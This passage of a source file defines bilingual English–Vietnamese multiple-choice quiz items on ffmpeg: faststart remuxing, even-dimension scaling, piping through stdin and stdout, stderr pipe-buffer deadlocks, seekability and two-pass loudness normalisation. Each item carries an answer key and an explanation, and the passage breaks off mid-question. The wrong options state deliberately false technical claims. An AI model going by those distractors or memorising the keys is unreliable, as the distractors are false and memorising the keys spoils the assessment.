            'A slow start on an otherwise fine file is usually the index at the tail, and the previous question showed what fixes it: move <code>moov</code> to the front. That is a container operation, so <code>-c copy</code> applies — the streams are passed through untouched while the muxer rewrites the layout. Measured here at 63 ms against 922 ms for a full re-encode of the same ten seconds, and the copy is lossless by construction. The decision procedure is what matters more than the numbers: run <code>ffprobe</code>, look at <code>codec_name</code> for both streams, and only re-encode when something is actually wrong — a codec the browser cannot play, a pixel format Safari rejects, a resolution above your ladder. Note also that the re-encode produced a <em>smaller</em> file (3,481,119 vs 3,645,995) and that is not a reason to do it: the bytes came off as lost detail. Option 1 misreads "byte-identical" — the copy output is the same <em>size</em>, not the same layout, which is exactly the change that was needed. Option 3 is false and easy to check; <code>-movflags</code> is a muxer option and works with stream copy, which is the entire basis of the fast path. Option 4 addresses caching, which does nothing for a client that must read the tail before it can decode.',
            'Một file bình thường mà khởi động chậm thì thủ phạm thường là chỉ mục nằm ở đuôi, và câu trước đã cho thấy cái gì vá được: dời <code>moov</code> lên đầu. Đó là một thao tác CONTAINER, nên <code>-c copy</code> áp dụng được — các luồng được cho đi qua nguyên vẹn trong khi muxer viết lại bố cục. Đo ở đây là 63 ms so với 922 ms cho một lượt encode lại đầy đủ đúng mười giây đó, và bản copy thì theo cấu tạo là không mất chất lượng. Cái quan trọng hơn con số là QUY TRÌNH QUYẾT ĐỊNH: chạy <code>ffprobe</code>, nhìn <code>codec_name</code> của cả hai luồng, và chỉ encode lại khi có thứ gì thật sự sai — một codec trình duyệt không phát được, một pixel format Safari từ chối, một độ phân giải cao hơn bậc thang của bạn. Cũng lưu ý rằng lượt encode lại cho ra một file NHỎ HƠN (3.481.119 so với 3.645.995) và đó không phải lý do để làm: số byte đó mất đi dưới dạng chi tiết đã mất. Phương án 1 đọc sai chữ "giống hệt từng byte" — output của lượt copy có cùng KÍCH THƯỚC chứ không cùng bố cục, và chính thay đổi bố cục mới là thứ cần thiết. Phương án 3 sai và dễ kiểm; <code>-movflags</code> là một tuỳ chọn của muxer và chạy được với stream copy, đó chính là toàn bộ nền tảng của đường nhanh. Phương án 4 nói về cache, vốn chẳng giúp gì cho một client buộc phải đọc phần đuôi trước khi giải mã được.',
          ),
        }),

        // q24 · đáp án 3
        mcq({
          prompt: B(
            'Two scale filters were run against a 640×360 source, both targeting height 357:' +
              code("-vf \"scale=-1:357\"  → [libx264] width not divisible by 2 (635x357)\n-vf \"scale=-2:357\"  → [libx264] height not divisible by 2 (634x357)") +
              'Both failed. What is the rule, and what is the correct filter?',
            'Hai bộ lọc scale được chạy trên nguồn 640×360, cả hai nhắm chiều cao 357:' +
              code("-vf \"scale=-1:357\"  → [libx264] width not divisible by 2 (635x357)\n-vf \"scale=-2:357\"  → [libx264] height not divisible by 2 (634x357)") +
              'Cả hai đều hỏng. Quy tắc là gì, và bộ lọc đúng là gì?',
          ),
          options: [
            B(
              '<code>-2</code> is only honoured for the <em>height</em> position; in the width position it is parsed as a literal negative width and libx264 rounds it to the nearest even value on its own. Write <code>scale=357:-2</code> and let the filter transpose.',
              '<code>-2</code> chỉ được tôn trọng ở vị trí CHIỀU CAO; ở vị trí chiều rộng nó được phân giải như một chiều rộng âm theo nghĩa đen và libx264 tự làm tròn về giá trị chẵn gần nhất. Hãy viết <code>scale=357:-2</code> rồi để bộ lọc tự hoán vị.',
            ),
            B(
              'Both failures are the same one: 4:2:0 chroma is subsampled by two on each axis, so any odd dimension is rejected. Adding <code>-pix_fmt yuv444p</code> removes the constraint entirely and both filters then work as written.',
              'Cả hai lỗi là một: chroma 4:2:0 được hạ mẫu hai lần trên mỗi trục, nên mọi kích thước lẻ đều bị từ chối. Thêm <code>-pix_fmt yuv444p</code> xoá hẳn ràng buộc đó và khi ấy cả hai bộ lọc đều chạy đúng như đã viết.',
            ),
            B(
              'The error is in the filter chain, not the encoder: <code>scale</code> needs an explicit <code>flags=bicubic</code> when either dimension is computed, because the default nearest-neighbour path cannot resample to a non-integer ratio. Both commands work once flags are given.',
              'Lỗi nằm ở chuỗi bộ lọc chứ không phải bộ encode: <code>scale</code> cần một <code>flags=bicubic</code> tường minh khi có chiều nào được tính ra, vì đường nearest-neighbour mặc định không lấy mẫu lại được theo tỉ lệ không nguyên. Cả hai lệnh đều chạy khi đã cho flags.',
            ),
            B(
              'H.264 with 4:2:0 chroma needs <b>both</b> dimensions even. <code>-1</code> computes the other side from the aspect ratio and can land odd (635); <code>-2</code> computes it and rounds to even (634) — but it only fixes the dimension it <em>computes</em>. Here 357 was typed by hand and is odd, so the failure just moved from the width to the height. Use <code>-2</code> <em>and</em> make the value you type even: <code>scale=-2:356</code>.',
              'H.264 với chroma 4:2:0 cần CẢ HAI chiều đều chẵn. <code>-1</code> tính chiều còn lại từ tỉ lệ khung hình và có thể rơi vào số lẻ (635); <code>-2</code> cũng tính rồi làm tròn về chẵn (634) — nhưng nó chỉ sửa được cái chiều mà nó TỰ TÍNH. Ở đây 357 là do bạn tự gõ và nó lẻ, nên lỗi chỉ đơn giản là dời từ chiều rộng sang chiều cao. Hãy dùng <code>-2</code> VÀ làm cho con số bạn gõ cũng chẵn: <code>scale=-2:356</code>.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'The second row is the part that catches people who already know the <code>-1</code> versus <code>-2</code> rule. In 4:2:0 the chroma planes are half resolution on both axes, so an odd width or an odd height has no valid chroma sample count and libx264 refuses. <code>-1</code> derives the free dimension from the aspect ratio and cheerfully returns 635. <code>-2</code> derives it and rounds to 634 — the fix works, and the error simply relocates to the dimension it never touched, because 357 came from the command line. So the habit is two-sided: use <code>-2</code> for the computed side <em>and</em> keep the side you write even. In a ladder, that means the rung heights should be 360, 720, 1080 rather than anything you arrived at by dividing. Option 1 invents a positional asymmetry; <code>-2</code> works in either slot. Option 2 is technically true about where the constraint comes from and operationally terrible — moving the whole pipeline to 4:4:4 to avoid rounding is exactly how you produce the Safari black screen from the earlier question. Option 3 invents a scaler requirement; <code>flags</code> selects the resampling kernel and has no bearing on parity.',
            'Dòng thứ hai mới là phần bẫy được cả những người vốn đã biết quy tắc <code>-1</code> so với <code>-2</code>. Trong 4:2:0, các mặt phẳng chroma có độ phân giải bằng một nửa trên cả hai trục, nên một chiều rộng lẻ hay một chiều cao lẻ đều không có số mẫu chroma hợp lệ và libx264 từ chối. <code>-1</code> suy chiều tự do từ tỉ lệ khung hình rồi vui vẻ trả về 635. <code>-2</code> cũng suy ra rồi làm tròn về 634 — cách vá có tác dụng, và lỗi chỉ đơn giản là dời sang cái chiều mà nó không hề đụng tới, vì 357 đến từ dòng lệnh. Nên thói quen phải có hai vế: dùng <code>-2</code> cho chiều được tính VÀ giữ cho chiều bạn tự viết cũng chẵn. Trong một bậc thang, điều đó nghĩa là chiều cao các bậc nên là 360, 720, 1080 chứ đừng là con số bạn có được từ một phép chia. Phương án 1 bịa ra một sự bất đối xứng theo vị trí; <code>-2</code> chạy ở cả hai ô. Phương án 2 về mặt kỹ thuật thì đúng về nguồn gốc ràng buộc và về mặt vận hành thì tệ hại — dời cả pipeline sang 4:4:4 để né chuyện làm tròn đúng là cách bạn tạo ra màn hình đen của Safari ở câu trước. Phương án 3 bịa ra một yêu cầu của bộ scale; <code>flags</code> chọn kernel lấy mẫu lại và không liên quan gì tới tính chẵn lẻ.',
          ),
        }),

        /* ── Chương 4 — âm thanh (6 câu) ──────────────────────────────────── */

        // q25 · đáp án 2
        mcq({
          prompt: B(
            'An MP3 decoder was run two ways and the byte counts recorded:' +
              code("cat quiet.mp3 | ffmpeg -i pipe:0 -f s16le -acodec pcm_s16le -ac 1 -ar 16000 pipe:1 | wc -c\n→ 256662\n\n(8,0 s × 16000 mẫu/s × 2 byte × 1 kênh = 256.000)") +
              'Which claim about this shape is true?',
            'Một bộ giải mã MP3 được chạy theo hai hướng và số byte được ghi lại:' +
              code("cat quiet.mp3 | ffmpeg -i pipe:0 -f s16le -acodec pcm_s16le -ac 1 -ar 16000 pipe:1 | wc -c\n→ 256662\n\n(8,0 s × 16000 mẫu/s × 2 byte × 1 kênh = 256.000)") +
              'Khẳng định nào về hình dạng này là đúng?',
          ),
          options: [
            B(
              'Piping is strictly slower than a temp file because the kernel copies each buffer twice, so the pattern is only worth using when the disk is unavailable; the byte count matching the formula is coincidental for uncompressed output.',
              'Chảy qua pipe chắc chắn chậm hơn dùng file tạm vì nhân sao chép mỗi buffer hai lần, nên pattern này chỉ đáng dùng khi không có đĩa; việc số byte khớp công thức chỉ là trùng hợp với output không nén.',
            ),
            B(
              'The output is only correct because <code>-f s16le</code> was given; without an explicit output format ffmpeg would have written an MP3 back to stdout, and it is the format flag rather than the pipe that removes the need for a temp file.',
              'Output chỉ đúng vì có <code>-f s16le</code>; nếu không nêu định dạng output tường minh thì ffmpeg sẽ ghi ngược một file MP3 ra stdout, và chính cái cờ định dạng chứ không phải cái pipe mới là thứ xoá được nhu cầu dùng file tạm.',
            ),
            B(
              'It removes the whole write-run-read-unlink sequence: no writable disk, no unique filename to invent, no cleanup obligation on every error path — and because no path is constructed from anything, there is also no filename that could reach a shell. The 256,662 bytes are the formula plus a small amount of decoder-edge padding, confirming the stream really did pass end to end.',
              'Nó xoá cả chuỗi ghi-chạy-đọc-xoá: không cần đĩa ghi được, không phải bịa một tên file duy nhất, không có nghĩa vụ dọn dẹp trên mọi nhánh lỗi — và vì không có đường dẫn nào được dựng từ thứ gì cả, cũng không có tên file nào có thể tới được một shell. 256.662 byte là đúng công thức cộng một chút đệm ở rìa của bộ giải mã, xác nhận rằng luồng dữ liệu đã thật sự đi trọn vẹn.',
            ),
            B(
              'The pipe form is equivalent to the temp-file form in every respect except error reporting, since ffmpeg buffers the entire input from stdin before starting anyway; the only real difference is that a failure now surfaces as a broken pipe rather than a missing file.',
              'Dạng pipe tương đương dạng file tạm ở mọi mặt trừ việc báo lỗi, vì đằng nào ffmpeg cũng đệm toàn bộ đầu vào từ stdin trước khi bắt đầu; khác biệt thật duy nhất là một lỗi giờ hiện ra dưới dạng đứt pipe thay vì thiếu file.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The temp-file dance is five filesystem operations, a disk dependency and a cleanup obligation that has to be honoured on the success path, the failure path and the timeout path alike — and a leak between steps two and four is invisible until the disk fills. Piping removes all of it: <code>pipe:0</code> in, <code>pipe:1</code> out, and the data never lands anywhere. The security half is worth stating explicitly because it connects to Chapter 3: no path is constructed at all, so there is no filename to sanitize and no shell for one to reach. The measurement confirms the round trip — 8 seconds of 16 kHz mono 16-bit PCM should be 256,000 bytes and 256,662 came out, the difference being decoder edge padding. Option 1 has the performance backwards; the streamed form holds only the in-flight chunks, and the earlier lesson measured ~12 MB RSS for a streamed chain against ~58-61 MB for buffered or temp-file forms. Option 2 confuses two independent requirements: <code>-f</code> is needed because a pipe has no extension to infer from, but it is not what makes piping viable. Option 4 is false on the mechanism — ffmpeg reads stdin incrementally, which is exactly why a non-seekable MP4 fails while an MP3 succeeds.',
            'Điệu nhảy file tạm là năm thao tác hệ thống file, một sự phụ thuộc vào đĩa và một nghĩa vụ dọn dẹp phải được tôn trọng trên cả nhánh thành công, nhánh lỗi lẫn nhánh quá hạn — và một chỗ rò giữa bước hai và bước bốn thì vô hình cho tới lúc đĩa đầy. Chảy qua pipe xoá sạch tất cả: <code>pipe:0</code> vào, <code>pipe:1</code> ra, và dữ liệu không đáp xuống đâu cả. Nửa bảo mật đáng nói thẳng ra vì nó nối với Chương 3: không có đường dẫn nào được dựng, nên không có tên file nào để làm sạch và không có shell nào cho nó tới. Phép đo xác nhận cả vòng đi-về — 8 giây PCM 16 kHz mono 16-bit đáng lẽ là 256.000 byte và kết quả ra 256.662, phần chênh là đệm ở rìa của bộ giải mã. Phương án 1 nói ngược về hiệu năng; dạng chảy dòng chỉ giữ những mẩu đang bay, và bài học trước đã đo ~12 MB RSS cho một chuỗi chảy dòng so với ~58-61 MB cho dạng đệm hoặc dạng file tạm. Phương án 2 lẫn hai yêu cầu độc lập: <code>-f</code> cần vì một cái pipe không có đuôi file để suy ra, nhưng nó không phải thứ làm cho việc chảy qua pipe khả thi. Phương án 4 sai về cơ chế — ffmpeg đọc stdin dần dần, và đó chính là lý do một MP4 không tua được thì hỏng còn một MP3 thì thành công.',
          ),
        }),

        // q26 · đáp án 3
        mcq({
          prompt: B(
            'A worker spawns ffmpeg, collects <code>stdout</code>, and ignores <code>stderr</code>. It works for most files and hangs until the 15-second timeout on a few. What is happening, and which two other details in that spawn wrapper matter for the same reason class?',
            'Một worker spawn ffmpeg, gom <code>stdout</code>, và bỏ qua <code>stderr</code>. Nó chạy tốt với hầu hết file và treo tới timeout 15 giây với vài file. Chuyện gì đang xảy ra, và hai chi tiết nào khác trong cái vỏ bọc spawn đó cũng quan trọng vì cùng một lớp lý do?',
          ),
          options: [
            B(
              'ffmpeg is genuinely slower on those codecs, and the timeout is simply too tight. Raise it to 60 seconds, and separately make sure you call <code>ff.stdin.end()</code> so the decoder knows the input is complete rather than waiting for more. Nothing about the pipe buffer is involved here, because Node reads whatever the child writes as soon as it arrives.',
              'ffmpeg thật sự chậm hơn với những codec đó, và timeout đơn giản là quá chặt. Hãy nâng lên 60 giây, và song song đó bảo đảm bạn có gọi <code>ff.stdin.end()</code> để bộ giải mã biết đầu vào đã hết chứ không ngồi chờ thêm. Bộ đệm pipe hoàn toàn không liên quan ở đây, vì Node đọc bất cứ thứ gì tiến trình con ghi ra ngay khi nó tới.',
            ),
            B(
              'Node buffers child output on the event loop, so a large <code>stderr</code> starves the loop and the <code>close</code> callback is never scheduled. The fixes are to raise <code>maxBuffer</code> and to move the spawn into a worker thread so the loop stays free. Sixty-four megabytes and a worker thread remove both halves of the problem at once.',
              'Node đệm output của tiến trình con trên event loop, nên một <code>stderr</code> lớn làm đói vòng lặp và callback <code>close</code> không bao giờ được xếp lịch. Cách vá là nâng <code>maxBuffer</code> và dời lượt spawn vào một worker thread để vòng lặp luôn rảnh. Sáu mươi tư megabyte cộng một worker thread xoá cả hai nửa của vấn đề cùng lúc.',
            ),
            B(
              'Those files trigger ffmpeg\'s interactive prompt, which writes to <code>stderr</code> and waits for a keystroke on <code>stdin</code>; passing <code>-y</code> and <code>-nostdin</code> removes it, as does closing <code>stdin</code> earlier. That prompt is the one ffmpeg shows when an output file already exists, and it writes nothing further until it is answered.',
              'Những file đó kích hoạt lời nhắc tương tác của ffmpeg, vốn ghi ra <code>stderr</code> rồi chờ một phím bấm trên <code>stdin</code>; truyền <code>-y</code> và <code>-nostdin</code> loại bỏ nó, và đóng <code>stdin</code> sớm hơn cũng vậy. Lời nhắc đó là lời nhắc ffmpeg hiện khi file output đã tồn tại, và nó không ghi thêm gì nữa cho tới khi được trả lời.',
            ),
            B(
              'The OS pipe buffer is about 64 KB. A child that writes more <code>stderr</code> than that blocks <em>in the write call</em> waiting for a reader, so it never exits and your <code>close</code> handler never fires — it presents as "ffmpeg is slow on some files" and is really "ffmpeg is chatty on some files". Attach a <code>data</code> listener or call <code>.resume()</code>. The same class of care explains the other two: settle the promise exactly once because <code>error</code> and <code>close</code> can both fire, and use <code>SIGKILL</code> rather than <code>SIGTERM</code> on timeout because a wedged native loop can ignore <code>SIGTERM</code>.',
              'Bộ đệm pipe của hệ điều hành khoảng 64 KB. Một tiến trình con ghi <code>stderr</code> quá mức đó sẽ chặn NGAY TRONG LỆNH GHI để chờ một người đọc, nên nó không bao giờ thoát và handler <code>close</code> của bạn không bao giờ chạy — nó hiện ra như "ffmpeg chậm với một số file" mà thật ra là "ffmpeg nói nhiều với một số file". Hãy gắn một listener <code>data</code> hoặc gọi <code>.resume()</code>. Cùng lớp cẩn trọng đó giải thích hai chi tiết kia: hãy chốt promise đúng MỘT lần vì <code>error</code> và <code>close</code> đều có thể nổ, và dùng <code>SIGKILL</code> chứ không phải <code>SIGTERM</code> lúc quá hạn vì một vòng lặp native đang kẹt có thể phớt lờ <code>SIGTERM</code>.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'A pipe is a fixed-size kernel buffer, typically 64 KB. Once it is full, the writing process blocks inside <code>write(2)</code> until somebody drains it. ffmpeg writes progress and warnings to <code>stderr</code>, so a file that produces a lot of warnings — an unusual codec, a stream with errors, a long encode with <code>-progress</code> — is exactly the file that deadlocks a wrapper which never reads that pipe. The symptom is maddening because it is content-dependent: most files never fill 64 KB, so the bug looks like a performance quirk. This is also why <code>exec()</code>\'s 1 MB <code>maxBuffer</code> is a real ceiling rather than a formality. The two companions are the same kind of "handle the case that only sometimes happens": a failed spawn can emit <code>error</code> and then <code>close</code>, so a boolean guard stops a retry loop running twice; and a decoder stuck in native code may not honour <code>SIGTERM</code>, so a timeout that is supposed to be a guarantee must use <code>SIGKILL</code>. Option 1 treats the symptom and would raise the hang from 15 seconds to 60. Option 2 misdescribes Node — the pipe is drained by the OS into libuv only when you read it; nothing is starving the loop. Option 3 names a real flag pair worth having, but <code>-nostdin</code> does not help a process blocked writing to a full <code>stderr</code>.',
            'Một cái pipe là một bộ đệm nhân có kích thước cố định, thường là 64 KB. Khi nó đầy, tiến trình đang ghi bị chặn ngay bên trong <code>write(2)</code> cho tới khi có ai đó rút cạn. ffmpeg ghi tiến độ và cảnh báo ra <code>stderr</code>, nên một file sinh ra nhiều cảnh báo — một codec bất thường, một luồng có lỗi, một lượt encode dài kèm <code>-progress</code> — đúng là cái file làm kẹt cứng một vỏ bọc không bao giờ đọc cái pipe đó. Triệu chứng gây phát điên vì nó phụ thuộc nội dung: hầu hết file không bao giờ lấp đầy 64 KB, nên bug trông như một sự trái tính về hiệu năng. Đây cũng là lý do <code>maxBuffer</code> 1 MB của <code>exec()</code> là một cái trần thật chứ không phải chuyện hình thức. Hai người bạn đồng hành cũng thuộc kiểu "xử lý trường hợp chỉ thỉnh thoảng xảy ra": một lượt spawn thất bại có thể phát <code>error</code> rồi <code>close</code>, nên một biến boolean canh cửa ngăn vòng lặp retry chạy hai lần; và một bộ giải mã kẹt trong mã native có thể không tôn trọng <code>SIGTERM</code>, nên một timeout đáng lẽ phải là một BẢO ĐẢM thì buộc phải dùng <code>SIGKILL</code>. Phương án 1 chữa triệu chứng và sẽ nâng cú treo từ 15 giây lên 60 giây. Phương án 2 mô tả sai Node — cái pipe chỉ được hệ điều hành rút vào libuv khi bạn ĐỌC nó; không có gì đang làm đói vòng lặp. Phương án 3 nêu một cặp cờ có thật và đáng có, nhưng <code>-nostdin</code> không giúp gì cho một tiến trình đang bị chặn vì ghi vào một <code>stderr</code> đã đầy.',
          ),
        }),

        // q27 · đáp án 0
        mcq({
          prompt: B(
            'Four pipe experiments on the same 10-second MP4:' +
              code("MP3 → pipe:0                                 OK, 256662 byte ra\nMP4 (moov ở CUỐI) → pipe:0     Error during demuxing: Invalid data found when processing input\nMP4 (+faststart) → pipe:0                    OK, 62372 byte JPEG ra\nghi MP4 ra pipe:1                            muxer does not support non seekable output") +
              'What single property explains all four rows?',
            'Bốn thí nghiệm pipe trên cùng một MP4 10 giây:' +
              code("MP3 → pipe:0                                 OK, ra 256662 byte\nMP4 (moov ở CUỐI) → pipe:0     Error during demuxing: Invalid data found when processing input\nMP4 (+faststart) → pipe:0                    OK, ra 62372 byte JPEG\nghi MP4 ra pipe:1                            muxer does not support non seekable output") +
              'Một tính chất duy nhất nào giải thích được cả bốn dòng?',
          ),
          options: [
            B(
              'Seekability. A pipe is a one-way stream with no <code>lseek</code>, so a format only works through one when everything needed is reachable in forward order. MP3 is a frame stream and always is. An MP4 whose <code>moov</code> index sits after the media data is not — hence row two — while <code>+faststart</code> puts the index first and makes row three work. Writing MP4 fails because the muxer must go back and patch the index, which is why the fragmented form <code>-movflags frag_keyframe+empty_moov</code> is the escape hatch.',
              'Khả năng TUA. Một cái pipe là luồng một chiều không có <code>lseek</code>, nên một định dạng chỉ chạy qua nó khi mọi thứ cần thiết đều với tới được theo thứ tự tiến. MP3 là một luồng frame nên luôn đạt. Một MP4 có chỉ mục <code>moov</code> nằm sau phần dữ liệu media thì không — nên mới có dòng hai — còn <code>+faststart</code> đặt chỉ mục lên trước và làm dòng ba chạy được. Ghi MP4 thì hỏng vì muxer phải quay lại vá chỉ mục, và đó là lý do dạng phân mảnh <code>-movflags frag_keyframe+empty_moov</code> là cửa thoát.',
            ),
            B(
              'Buffer size. A pipe delivers at most 64 KB per read, and the MP4 header exceeds that in the failing cases; enlarging the pipe with <code>-probesize</code> and <code>-analyzeduration</code> makes all four rows succeed without changing the file layout.',
              'Kích thước bộ đệm. Một cái pipe trả về tối đa 64 KB mỗi lượt đọc, và header MP4 vượt mức đó trong các trường hợp hỏng; nới cái pipe bằng <code>-probesize</code> và <code>-analyzeduration</code> làm cả bốn dòng thành công mà không cần đổi bố cục file.',
            ),
            B(
              'Codec support. The MP4 rows fail because H.264 cannot be demuxed without a container index that names its SPS/PPS parameter sets, whereas MP3 carries them in every frame; converting the video to a codec with in-band parameters makes MP4 pipe cleanly.',
              'Hỗ trợ codec. Các dòng MP4 hỏng vì H.264 không thể demux nếu không có một chỉ mục container nêu tên các bộ tham số SPS/PPS của nó, trong khi MP3 mang chúng trong mọi frame; chuyển video sang một codec có tham số nội tuyến sẽ làm MP4 chảy qua pipe sạch sẽ.',
            ),
            B(
              'Direction. ffmpeg supports reading from a pipe for any format but writing to one only for raw formats, so rows one to three are all fine and only row four is a real limitation; row two failed for an unrelated reason, namely that the remux left the file truncated.',
              'Chiều. ffmpeg hỗ trợ ĐỌC từ pipe với mọi định dạng nhưng chỉ hỗ trợ GHI ra pipe với các định dạng thô, nên dòng một tới ba đều ổn và chỉ dòng bốn là giới hạn thật; dòng hai hỏng vì một lý do không liên quan, đó là lượt remux đã để file bị cắt cụt.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'One property, four consequences. A pipe cannot be rewound, so any operation that needs to jump — backwards to read an index, or backwards to write one — fails on it. MP3 is a sequence of self-describing frames, so a decoder can start at byte zero and never look back. MP4 keeps a <code>moov</code> index that most encoders write <em>after</em> the media, and a demuxer that cannot seek to it has nothing to work with, which produces the misleading <code>Invalid data found when processing input</code> — a message that reads like corruption and means "I could not reach the part I needed". Rows two and three are the same file with the index in two positions, which isolates the cause exactly. Writing has the mirror problem: the MP4 muxer finalises the index at the end and must seek back to patch offsets, so it refuses a non-seekable output and says so plainly. The fragmented variant sidesteps it by writing self-contained fragments with no global index to patch. Option 2 confuses the pipe buffer with a read limit; ffmpeg reads as many times as it likes. Option 3 is wrong about H.264 in MP4, where parameter sets live in the sample description and are reachable once the index is. Option 4 is contradicted by row three, where the same format piped in successfully.',
            'Một tính chất, bốn hệ quả. Một cái pipe không tua lui được, nên mọi thao tác cần nhảy — lui lại để ĐỌC một chỉ mục, hay lui lại để GHI một chỉ mục — đều hỏng trên nó. MP3 là một chuỗi các frame tự mô tả, nên bộ giải mã bắt đầu ở byte số không và không bao giờ phải nhìn lại. MP4 giữ một chỉ mục <code>moov</code> mà hầu hết bộ encode ghi SAU phần media, và một bộ demux không tua tới đó được thì chẳng có gì để làm việc, sinh ra thông báo gây hiểu lầm <code>Invalid data found when processing input</code> — một câu đọc như là file hỏng nhưng nghĩa là "tôi không với tới được phần tôi cần". Dòng hai và dòng ba là cùng một file với chỉ mục ở hai vị trí, và điều đó cô lập nguyên nhân một cách chính xác. Chiều ghi có vấn đề đối xứng: bộ muxer MP4 chốt chỉ mục ở cuối và phải tua lui để vá các offset, nên nó từ chối một output không tua được và nói thẳng ra như vậy. Dạng phân mảnh né được điều đó bằng cách ghi những mảnh tự chứa, không có chỉ mục toàn cục nào để vá. Phương án 2 lẫn bộ đệm pipe với một giới hạn đọc; ffmpeg đọc bao nhiêu lượt tuỳ nó. Phương án 3 sai về H.264 trong MP4, nơi các bộ tham số nằm trong phần mô tả mẫu và với tới được ngay khi chỉ mục với tới được. Phương án 4 bị chính dòng ba bác bỏ, nơi cùng định dạng đó chảy vào qua pipe thành công.',
          ),
        }),

        // q28 · đáp án 1
        mcq({
          prompt: B(
            'Pass 1 of a two-pass loudness normalisation was run on a deliberately quiet MP3:' +
              code("{\n\t\"input_i\" : \"-42.15\",\n\t\"input_tp\" : \"-38.33\",\n\t\"input_lra\" : \"0.00\",\n\t\"input_thresh\" : \"-52.15\",\n\t\"output_i\" : \"-14.03\",\n\t\"output_tp\" : \"-10.17\",\n\t\"normalization_type\" : \"dynamic\",\n\t\"target_offset\" : \"0.03\"\n}") +
              'Why does this run report <code>dynamic</code>, and why does that matter?',
            'Lượt 1 của một lần chuẩn hoá độ to hai lượt được chạy trên một MP3 cố ý làm nhỏ tiếng:' +
              code("{\n\t\"input_i\" : \"-42.15\",\n\t\"input_tp\" : \"-38.33\",\n\t\"input_lra\" : \"0.00\",\n\t\"input_thresh\" : \"-52.15\",\n\t\"output_i\" : \"-14.03\",\n\t\"output_tp\" : \"-10.17\",\n\t\"normalization_type\" : \"dynamic\",\n\t\"target_offset\" : \"0.03\"\n}") +
              'Vì sao lượt này báo <code>dynamic</code>, và vì sao điều đó quan trọng?',
          ),
          options: [
            B(
              'Because the source is an MP3 rather than PCM. Lossy input cannot be measured accurately enough for a linear gain, so the filter always falls back to dynamic mode on compressed sources; decode to WAV first and pass 1 will report <code>linear</code>.',
              'Vì nguồn là MP3 chứ không phải PCM. Đầu vào có mất dữ liệu thì không đo đủ chính xác cho một phép khuếch đại tuyến tính, nên bộ lọc luôn lùi về chế độ động với các nguồn đã nén; hãy giải mã sang WAV trước rồi lượt 1 sẽ báo <code>linear</code>.',
            ),
            B(
              'Because this invocation has no <code>measured_*</code> values to work from — it <em>is</em> the measuring pass. Integrated loudness is defined over the whole programme, so a single pass cannot know it in advance and must adapt gain as it goes, which audibly pumps and squashes dynamics. Pass 2 feeds the four measured numbers back in and gets one constant gain for the file; seeing <code>dynamic</code> on what you believe is a two-pass run means the measured values never reached the filter.',
              'Vì lượt gọi này không có giá trị <code>measured_*</code> nào để dựa vào — nó CHÍNH LÀ lượt đo. Độ to tích hợp được định nghĩa trên toàn bộ chương trình, nên một lượt duy nhất không thể biết trước và buộc phải chỉnh khuếch đại theo dòng chảy, gây hiện tượng "bơm" nghe thấy được và bóp dẹp dải động. Lượt 2 nạp bốn con số đã đo ngược vào và nhận về một hệ số khuếch đại hằng cho cả file; thấy <code>dynamic</code> trên cái mà bạn tin là một lượt chạy hai-lượt nghĩa là các giá trị đo được chưa bao giờ tới được bộ lọc.',
            ),
            B(
              'Because <code>input_lra</code> is 0.00. The filter switches to dynamic whenever the loudness range is degenerate, since a linear gain would be indistinguishable from no processing at all on material with no dynamics; on real music the same command reports <code>linear</code>.',
              'Vì <code>input_lra</code> bằng 0,00. Bộ lọc chuyển sang chế độ động bất cứ khi nào dải độ to bị suy biến, vì trên chất liệu không có dải động thì một phép khuếch đại tuyến tính không phân biệt được với việc không xử lý gì; trên nhạc thật thì cùng câu lệnh đó báo <code>linear</code>.',
            ),
            B(
              'Because <code>print_format</code> was set. Requesting a machine-readable report puts the filter into an analysis mode that never applies a linear gain, which is why the same command with <code>print_format=summary</code> reports <code>linear</code> instead.',
              'Vì có đặt <code>print_format</code>. Yêu cầu một báo cáo máy đọc được sẽ đưa bộ lọc vào một chế độ phân tích không bao giờ áp khuếch đại tuyến tính, và đó là lý do cùng câu lệnh với <code>print_format=summary</code> lại báo <code>linear</code>.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Integrated loudness is a property of the whole file, so it cannot be known until the last sample has been read. That is the entire reason the procedure has two passes. Pass 1 measures and discards the audio (<code>-f null -</code>); pass 2 is given <code>measured_I</code>, <code>measured_TP</code>, <code>measured_LRA</code> and <code>measured_thresh</code> and can therefore compute one constant gain that lands the programme on target without touching the mix. Run the filter once with no measured values and it has to guess as it goes — that is <code>dynamic</code> mode, it is audible, and it is meant for live streams where there is no second pass to be had. The practical value of this field is as a check: if a pipeline you believe is two-pass still reports <code>dynamic</code>, the measured values are not reaching the filter, which is exactly the failure the next question is about. Option 1 invents an input-format rule; the same file with the measured values supplied reports <code>linear</code>. Option 3 reads a correlation as a cause — this synthetic tone genuinely has <code>lra 0.00</code>, but a music file with no measured values reports <code>dynamic</code> too. Option 4 confuses the report format with the processing mode.',
            'Độ to tích hợp là một tính chất của TOÀN BỘ file, nên không thể biết nó cho tới khi mẫu cuối cùng được đọc. Đó là toàn bộ lý do quy trình này có hai lượt. Lượt 1 đo rồi vứt bỏ phần âm thanh (<code>-f null -</code>); lượt 2 được cho <code>measured_I</code>, <code>measured_TP</code>, <code>measured_LRA</code> và <code>measured_thresh</code> nên tính được một hệ số khuếch đại HẰNG đưa chương trình về đúng đích mà không đụng tới bản phối. Chạy bộ lọc một lượt không có giá trị đo nào thì nó phải đoán theo dòng chảy — đó là chế độ <code>dynamic</code>, nó nghe thấy được, và nó dành cho các luồng trực tiếp vốn không có lượt thứ hai nào để mà chạy. Giá trị thực dụng của trường này là làm một PHÉP KIỂM: nếu một pipeline mà bạn tin là hai-lượt vẫn báo <code>dynamic</code>, thì các giá trị đo được không tới được bộ lọc, và đó đúng là kiểu hỏng của câu kế tiếp. Phương án 1 bịa ra một quy tắc theo định dạng đầu vào; đúng file đó khi được cấp các giá trị đo sẽ báo <code>linear</code>. Phương án 3 đọc một tương quan thành nguyên nhân — tiếng tone tổng hợp này quả thật có <code>lra 0,00</code>, nhưng một file nhạc không có giá trị đo cũng báo <code>dynamic</code>. Phương án 4 lẫn định dạng báo cáo với chế độ xử lý.',
          ),
        }),

        // q29 · đáp án 3
        mcq({
          prompt: B(
            'A loudness feature ran three ffmpeg passes per track, logged one <code>warn</code> line, and returned success — while every track came out unnormalised. The filter string had been assembled by <code>.join(\' \')</code>-ing two array entries. The exact split was reproduced:' +
